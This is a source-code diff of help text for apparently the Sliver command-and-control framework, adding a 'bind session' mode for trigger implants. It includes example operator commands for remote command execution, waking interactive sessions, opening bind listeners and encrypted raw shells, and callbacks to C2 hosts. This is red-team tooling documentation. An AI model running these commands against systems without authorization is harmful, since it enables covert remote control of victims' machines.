@@ -271,13 +271,17 @@ see 'help profiles new'. All "generate" flags can be saved into a profile, you c
 command.
 `
 	generateTriggerHelp = `[[.Bold]]Command:[[.Normal]] generate trigger <options>
-[[.Bold]]About:[[.Normal]] Generate a trigger implant with two operational modes, both always baked in:
+[[.Bold]]About:[[.Normal]] Generate a trigger implant with three operational modes, all always baked in:
 
   1. [[.Bold]]Ad-hoc exec[[.Normal]] -- bidirectional UDP command execution. Fire a signed "exec" packet;
      the implant runs the command and returns output over UDP. No C2 session required.
 
   2. [[.Bold]]Wake session[[.Normal]] -- on receipt of a signed "wake" packet, the implant establishes
-     an interactive SESSION (not a beacon) over its configured C2 transports.
+     an interactive SESSION (not a beacon) over its configured C2 transports (callback to server).
+
+  3. [[.Bold]]Bind session[[.Normal]] -- on receipt of a signed "wake --bind" packet, the implant opens
+     a local listener and the server connects back to it. Useful when the target cannot reach
+     the C2 server directly (e.g. segmented networks, inbound-only firewall rules).
 
 Trigger implants do NOT support beacon mode. Wake always establishes a full interactive session.
 
@@ -289,6 +293,22 @@ For maximum flexibility, specify BOTH transports so the implant can use TCP or U
 wake callback depending on network conditions:
 	generate trigger --trigger-wake-bind 0.0.0.0:46290 --trigger-wake-secret-env TRIGGER_SECRET \
 		--mtls c2.example.com --wg c2.example.com:9090
+
+[[.Bold]][[.Underline]]++ Bind Session ++[[.Normal]]
+Instead of having the implant call back to the C2, a bind session tells the implant to open
+a listener. The server then connects to the implant. All bind traffic is authenticated with
+HMAC and encrypted with ChaCha20-Poly1305. The listener auto-closes after a 30s TTL by default.
+
+  trigger send 1 wake --bind                                  TCP bind on random port
+  trigger send 1 wake --bind --bind-port 5555                 TCP bind on specific port
+  trigger send 1 wake --bind --bind-proto udp                 UDP bind (KCP full session)
+  trigger send 1 wake --bind --bind-proto udp --no-session    UDP encrypted raw shell
+  trigger send 1 wake --bind --no-connect                     Don't auto-connect
+  trigger connect 1 tcp://0.0.0.0:52341                       Manual connect later
+
+Use --no-connect when you want to fire the bind trigger now but connect at a later time
+(e.g. wait for a firewall rule change). The implant reports the listener address in its
+trigger response; use 'trigger connect' to establish the session when ready.
 
 [[.Bold]][[.Underline]]++ Basic Usage ++[[.Normal]]
 Generate a trigger implant with TCP callback:
@@ -331,15 +351,23 @@ The index can be used with 'trigger send <index> <intent>' to fire trigger packe
 manually specifying the target IP, port, and secret.
 
 [[.Bold]][[.Underline]]++ Subcommands ++[[.Normal]]
-  triggers target <index> <ip>    Associate a target IP with a trigger implant by index.
-                                   The mapping is stored client-side in ~/.sliver-client/triggers.json.
+  triggers target <index> <ip>          Associate a target IP with a trigger implant by index.
+                                         The mapping is stored client-side in ~/.sliver-client/triggers.json.
+  trigger connect <index> <url>         Connect to a bind listener opened by a previous trigger send.
+                                         Example: trigger connect 1 tcp://10.0.0.42:52341
 
 [[.Bold]][[.Underline]]++ Examples ++[[.Normal]]
-  triggers                         List all trigger implants with their index, name, port, etc.
-  triggers target 1 192.168.1.42   Store target IP for trigger at index 1.
-  trigger send 1 wake              Send a wake packet to trigger #1 (uses stored target + build config).
-  trigger send 1 exec --payload "whoami"   Execute a command on trigger #1.
-  trigger send 1 wake --callback mtls://10.0.0.5:8888   Wake with dynamic callback address.
+  triggers                                                   List all trigger implants.
+  triggers target 1 192.168.1.42                             Store target IP for trigger #1.
+  trigger send 1 wake                                        Callback session (mTLS/WG).
+  trigger send 1 exec --payload "whoami"                     Ad-hoc command execution.
+  trigger send 1 wake --callback mtls://10.0.0.5:8888        Dynamic callback address.
+  trigger send 1 wake --bind                                 TCP bind on random port.
+  trigger send 1 wake --bind --bind-port 5555                TCP bind on port 5555.
+  trigger send 1 wake --bind --bind-proto udp                UDP bind (KCP session).
+  trigger send 1 wake --bind --no-connect                    Bind without auto-connect.
+  trigger connect 1 tcp://0.0.0.0:52341                      Manual connect to bind listener.
+  trigger send 1 wake --ttl 60s                              Wake with 60s session TTL.
 `
 
 	stageListenerHelp = `[[.Bold]]Command:[[.Normal]] stage-listener <options>
